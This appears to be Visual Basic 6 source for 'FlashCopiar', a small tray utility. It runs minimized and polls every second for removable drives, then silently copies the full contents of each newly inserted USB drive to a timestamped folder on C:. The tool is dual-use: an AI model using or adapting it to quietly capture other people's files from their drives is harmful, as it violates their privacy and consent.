VERSION 5.00
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.2#0"; "RICHTX32.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "FlashCopiar v.1.0 a"
   ClientHeight    =   495
   ClientLeft      =   3840
   ClientTop       =   3855
   ClientWidth     =   3510
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   495
   ScaleWidth      =   3510
   ShowInTaskbar   =   0   'False
   Begin VB.PictureBox pichook 
      Height          =   540
      Left            =   1200
      Picture         =   "Form1.frx":0CCA
      ScaleHeight     =   480
      ScaleWidth      =   480
      TabIndex        =   2
      Top             =   840
      Width           =   540
   End
   Begin RichTextLib.RichTextBox Drv_Ltr 
      Height          =   255
      Left            =   480
      TabIndex        =   1
      Top             =   840
      Visible         =   0   'False
      Width           =   495
      _ExtentX        =   873
      _ExtentY        =   450
      _Version        =   393217
      TextRTF         =   $"Form1.frx":1994
   End
   Begin RichTextLib.RichTextBox RTF 
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   3255
      _ExtentX        =   5741
      _ExtentY        =   450
      _Version        =   393217
      BorderStyle     =   0
      ReadOnly        =   -1  'True
      Appearance      =   0
      TextRTF         =   $"Form1.frx":1A24
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   0
      Top             =   0
   End
   Begin VB.Menu mnuPopUp 
      Caption         =   "Pop"
      Visible         =   0   'False
      Begin VB.Menu mnuPopUpView 
         Caption         =   "View"
      End
      Begin VB.Menu mnuPopUpSep1 
         Caption         =   "-"
      End
      Begin VB.Menu mnuPopUpExit 
         Caption         =   "Exit"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetVolumeInformation Lib "Kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Long) As Long
Private Const MAX_FILENAME_LEN = 256
Private Declare Function GetDriveType Lib "Kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Dim Folder_Name As String
Dim Drives(14) As String, X As Long
Dim USB_Drv As String
Dim C As Byte, I As Byte
Dim Copy_Progress As Boolean
Dim File As New FileSystemObject 'you should add this from referances :(Microsoft Scripting Runtime)
Dim DD As String, OLD_USB As Long, NEW_USB As Long
Private Type NOTIFYICONDATA
    cbSize As Long
    hWnd As Long
    uId As Long
    uFlags As Long
    ucallbackMessage As Long
    hIcon As Long
    szTip As String * 64
End Type

Private Const NIM_ADD = &H0
Private Const NIM_MODIFY = &H1
Private Const NIM_DELETE = &H2
Private Const NIF_MESSAGE = &H1
Private Const NIF_ICON = &H2
Private Const NIF_TIP = &H4

Private Const WM_LBUTTONDBLCLK = &H203
Private Const WM_LBUTTONDOWN = &H201
Private Const WM_RBUTTONUP = &H205

Private Declare Function Shell_NotifyIcon Lib "shell32" Alias "Shell_NotifyIconA" (ByVal dwMessage As Long, pnid As NOTIFYICONDATA) As Boolean
Dim TrayI As NOTIFYICONDATA


Private Sub Form_Unload(Cancel As Integer)
    'remove the icon
    TrayI.cbSize = Len(TrayI)
    TrayI.hWnd = pichook.hWnd
    TrayI.uId = 1&
    Shell_NotifyIcon NIM_DELETE, TrayI
    End
End Sub

Private Sub Form_Load()
    Me.WindowState = vbMinimized
    Copy_Progress = False
    Call USB_Copy
    TrayI.cbSize = Len(TrayI)
    'Set the window's handle (this will be used to hook the specified window)
    TrayI.hWnd = pichook.hWnd
    'Application-defined identifier of the taskbar icon
    TrayI.uId = 1&
    'Set the flags
    TrayI.uFlags = NIF_ICON Or NIF_TIP Or NIF_MESSAGE
    'Set the callback message
    TrayI.ucallbackMessage = WM_LBUTTONDOWN
    'Set the picture (must be an icon!)
    TrayI.hIcon = Me.Icon
    'Set the tooltiptext
    TrayI.szTip = "FlashCopiar v.1.0 a" & Chr$(0)
    'Create the icon
    Shell_NotifyIcon NIM_ADD, TrayI
End Sub

Private Sub USB_Copy()
    On Error Resume Next
    Folder_Name = Date & "_" & Time
    RTF.Text = Folder_Name
    Call FindIt(RTF, "/", "-")
    Call FindIt(RTF, " ", "")
    Call FindIt(RTF, ":", "")
    Folder_Name = "C:\" & RTF.Text & "\"
    For I = 68 To 80
        C = C + 1
        Drives(C) = Chr(I) & ":"
    Next I
    For I = 1 To 13
        If GetDriveType(Drives(I)) = 2 Then
            USB_Drv = Drives(I) & "\*"
            Drv_Ltr.Text = Drives(I)
            Call FindIt(Drv_Ltr, ":", "")
            DD = Drv_Ltr.Text
            MousePointer = vbHourglass
            NEW_USB = DriveSerial(DD)
            If NEW_USB <> OLD_USB Or OLD_USB = 0 Then
                Copy_Progress = True
                TrayI.hIcon = pichook.Picture
                Shell_NotifyIcon NIM_MODIFY, TrayI
                File.CreateFolder Folder_Name
                File.CopyFolder USB_Drv, Folder_Name
                DoEvents
                USB_Drv = USB_Drv & "*.*"
                File.CopyFile USB_Drv, Folder_Name
                DoEvents
                MousePointer = vbDefault
                OLD_USB = NEW_USB
                Copy_Progress = False
                TrayI.hIcon = Me.Icon
                Shell_NotifyIcon NIM_MODIFY, TrayI
            End If
        Else
            USB_Drv = ""
            Copy_Progress = False
        End If
    Next I
End Sub

Private Sub mnuPopUpExit_Click()
    End
End Sub

Private Sub mnuPopUpView_Click()
    Me.WindowState = vbNormal
End Sub

Private Sub Timer1_Timer()
    If Copy_Progress = False Then
        C = 0
        X = 0
        NEW_USB = 0
        Call USB_Copy
    End If
End Sub

'I try to remove some letters from a string. I only find this solution from
'MSDN, so if you have any another solution please send it to my email:
'ahmadandnader@hotmail.com
'Thank you
Private Function FindIt(Box As RichTextBox, Srch As String, RplcTxt As String, Optional Start As Long)
Dim RetVal As Long
Dim Source As String
Source = Box.Text
If Start = 0 Then Start = 1
RetVal = InStr(Start, Source, Srch)
If RetVal <> 0 Then
    With Box
            .SelStart = RetVal - 1
            .SelLength = Len(Srch)
            .SelBold = True
            .SelText = RplcTxt
    End With
    Start = RetVal + Len(Srch)
    FindIt = 1 + FindIt(Box, Srch, RplcTxt, Start)
End If
End Function

Private Function DriveSerial(ByVal sDrv As String) As Long
    Dim RetVal As Long
    Dim str As String * MAX_FILENAME_LEN
    Dim str2 As String * MAX_FILENAME_LEN
    Dim a As Long
    Dim b As Long
    Call GetVolumeInformation(sDrv & ":\", str, MAX_FILENAME_LEN, RetVal, a, b, str2, MAX_FILENAME_LEN)
    DriveSerial = RetVal
End Function

Private Sub mnuPop_Click(Index As Integer)
    Select Case Index
        Case 0
            Me.WindowState = vbNormal
        Case 2
            Unload Me
    End Select
End Sub

Private Sub pichook_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Msg = X / Screen.TwipsPerPixelX
    If Msg = WM_LBUTTONDBLCLK Then
        'Left button double click
        mnuPop_Click 0
    ElseIf Msg = WM_RBUTTONUP Then
        'Right button click
        Me.PopupMenu mnuPopUp
    End If
End Sub
